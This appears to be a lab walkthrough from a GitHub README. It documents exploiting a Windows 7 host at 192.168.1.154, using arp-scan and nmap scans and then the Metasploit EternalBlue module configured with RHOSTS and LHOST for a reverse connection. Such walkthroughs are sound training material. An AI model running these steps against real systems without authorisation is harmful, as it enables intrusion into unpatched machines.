<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/2b137a71-3018-4d18-b8cd-04ef8c3918bc"></picture></h1>

## **DISCOVERING**
```bash
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/330d5006-3db7-4b91-a455-0419280d6267)

```bash
ping -c 1 192.168.1.154
```
![image](https://github.com/user-attachments/assets/b902063a-5b9e-49d3-bb65-272c47d57950)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.154 -oG allports
```
![image](https://github.com/user-attachments/assets/0043ae4a-6410-468e-9442-8e3eb04d78cd)

```bash
nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 192.168.1.154 -oN targeted
```
![image](https://github.com/user-attachments/assets/96470cbf-bc8c-4c20-84df-f741d31e8875)

## **It is a windows7 machine and has port 445 open so we will test if it is vulnerable to Ethernal Blue.**

```bash
nmap --script "vuln and safe" -p445 192.168.1.154
```
![image](https://github.com/user-attachments/assets/9a1730e1-08e0-42ca-a976-b546580284a3)

## **We started Metasploit**
```bash
sudo msfdb init && msfconsole
```
![image](https://github.com/user-attachments/assets/a89be94f-c6b9-4288-930d-7ae064a7e9ad)

## **We look for a sploit for the found vulnerability**
```bash
search eternalblue
```
![image](https://github.com/user-attachments/assets/67d00fe7-43f1-4777-aed0-32ff1f1e4810)

## **Explotation**

```bash
usea 0
show options
```
![image](https://github.com/user-attachments/assets/0aeb4831-dea3-41d5-ad93-319327b42c19)

## **Configuring attack**
```bash
set RHOSTS 192.168.1.154
set LHOST 192.168.1.228
show options
```
![image](https://github.com/user-attachments/assets/cc37f640-3511-4610-a06b-aa50a8be60eb)
```bash
run
```

## **We started an inquiry to obtain information**
![image](https://github.com/user-attachments/assets/7b361969-29b6-4c69-9048-c2458d6d2732)
![image](https://github.com/user-attachments/assets/e81424fe-729a-40fb-b240-6c9a15d86d0d)
![image](https://github.com/user-attachments/assets/09a95e5c-046f-4803-8bde-bd7e816c98e9)
![image](https://github.com/user-attachments/assets/accbb18e-9464-4c09-952b-4508334e3bdd)




